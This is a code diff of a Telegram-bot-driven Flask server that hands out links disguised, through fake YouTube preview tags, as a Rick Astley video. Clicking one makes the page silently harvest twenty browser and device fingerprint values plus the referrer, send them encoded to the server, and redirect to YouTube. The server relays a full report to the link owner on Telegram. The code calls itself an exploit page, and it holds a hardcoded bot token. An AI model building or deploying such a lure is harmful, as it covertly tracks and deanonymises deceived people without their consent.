@@ -12,6 +12,7 @@ from flask import Flask, render_template_string, request
 # =================================================================
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
 OVERLORD_ID = 6659724115 
+# ВАЖНО: Замени на свой URL после деплоя на Render
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -36,17 +37,20 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] LIGHTWEIGHT EXPLOIT PAGE
+# [2] ADVANCED EXPLOIT PAGE (20 DATA POINTS)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
     <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
+    <meta property="og:description" content="Official YouTube Video - 1.5B views" />
     <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
-    <meta property="og:description" content="YouTube Music Video" />
+    <meta property="og:site_name" content="YouTube" />
+    
     <title>YouTube</title>
     <style>
         body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
@@ -69,20 +73,34 @@ HTML_TEMPLATE = """
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
         
-        const payload = {
-            sid: sid,
-            ua: navigator.userAgent,
+        const info = {
             gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
-            res: screen.width + "x" + screen.height,
+            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
+            cores: navigator.hardwareConcurrency || "N/A",
             mem: navigator.deviceMemory || "N/A",
-            plat: navigator.platform
+            res: screen.width + "x" + screen.height,
+            depth: screen.colorDepth,
+            plat: navigator.platform,
+            lang: navigator.language,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            touch: navigator.maxTouchPoints,
+            cookies: navigator.cookieEnabled,
+            dnt: navigator.doNotTrack,
+            pdf: navigator.pdfViewerEnabled,
+            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
+            online: navigator.onLine,
+            hist: window.history.length,
+            ratio: window.devicePixelRatio,
+            plugins: navigator.plugins.length,
+            ua: navigator.userAgent
         };
 
-        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));
+        const payload = btoa(JSON.stringify({sid: sid, data: info, ref: document.referrer || "Direct"}));
+        navigator.sendBeacon('/gate/capture', payload);
 
         setTimeout(() => {
             window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-        }, 350);
+        }, 400);
     }
 </script>
 </body>
@@ -90,7 +108,7 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC
+# [3] SERVER LOGIC & DETAILED REPORTING
 # =================================================================
 
 @app.route('/v/<sid>')
@@ -100,22 +118,41 @@ def serve(sid):
 @app.route('/gate/capture', methods=['POST'])
 def capture():
     try:
-        data = json.loads(base64.b64decode(request.get_data()).decode())
-        sid = str(data.get('sid'))
+        raw = base64.b64decode(request.get_data()).decode()
+        payload = json.loads(raw)
+        sid = payload.get('sid')
+        d = payload.get('data', {})
         
         report = (
-            f"<b>✅ TARGET HIT</b>\n"
+            f"<b>📊 ПОЛНЫЙ ОТЧЕТ (20 ПАРАМЕТРОВ)</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 ID: <code>{sid}</code>\n"
-            f"🎮 GPU: <code>{data.get('gpu')}</code>\n"
-            f"🧠 HW: <code>{data.get('mem')}GB / {data.get('plat')}</code>\n"
-            f"📱 Res: <code>{data.get('res')}</code>\n"
+            f"1.  🆔 <b>ID:</b> <code>{sid}</code>\n"
+            f"2.  🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
+            f"3.  🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
+            f"4.  🧠 <b>Ядра:</b> <code>{d.get('cores')}</code>\n"
+            f"5.  💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
+            f"6.  📱 <b>Экран:</b> <code>{d.get('res')}</code>\n"
+            f"7.  🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
+            f"8.  🎨 <b>Цвет:</b> <code>{d.get('depth')} bit</code>\n"
+            f"9.  💻 <b>ОС:</b> <code>{d.get('plat')}</code>\n"
+            f"10. 📍 <b>Таймзона:</b> <code>{d.get('tz')}</code>\n"
+            f"11. 🗣 <b>Язык:</b> <code>{d.get('lang')}</code>\n"
+            f"12. 👆 <b>Touch:</b> <code>{d.get('touch')}</code>\n"
+            f"13. 🍪 <b>Cookie:</b> <code>{d.get('cookies')}</code>\n"
+            f"14. 🕵️ <b>DNT:</b> <code>{d.get('dnt')}</code>\n"
+            f"15. 📄 <b>PDF:</b> <code>{d.get('pdf')}</code>\n"
+            f"16. 🌙 <b>Dark:</b> <code>{d.get('dark')}</code>\n"
+            f"17. 📶 <b>Online:</b> <code>{d.get('online')}</code>\n"
+            f"18. 📂 <b>History:</b> <code>{d.get('hist')}</code>\n"
+            f"19. 🧩 <b>Plugins:</b> <code>{d.get('plugins')}</code>\n"
+            f"20. 🔗 <b>Ref:</b> <code>{payload.get('ref')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🌐 UA: <code>{data.get('ua')[:100]}...</code>"
+            f"🛰 <b>UA:</b>\n<code>{d.get('ua')}</code>"
         )
         
+        owner_id = get_owner(str(sid))
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                      json={"chat_id": get_owner(sid), "text": report, "parse_mode": "HTML"})
+                      json={"chat_id": owner_id, "text": report, "parse_mode": "HTML"})
     except: pass
     return "OK"
 
@@ -141,7 +178,7 @@ def bot_loop():
                         save_link(str(cid), cid)
                         link = f"{BASE_URL}/v/{cid}"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": f"🔗 <b>Link:</b>\n<a href='{link}'>{link}</a>", "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": f"🔥 <b>Система готова!</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>", "parse_mode": "HTML"})
         except: time.sleep(5)
 
 if __name__ == '__main__':
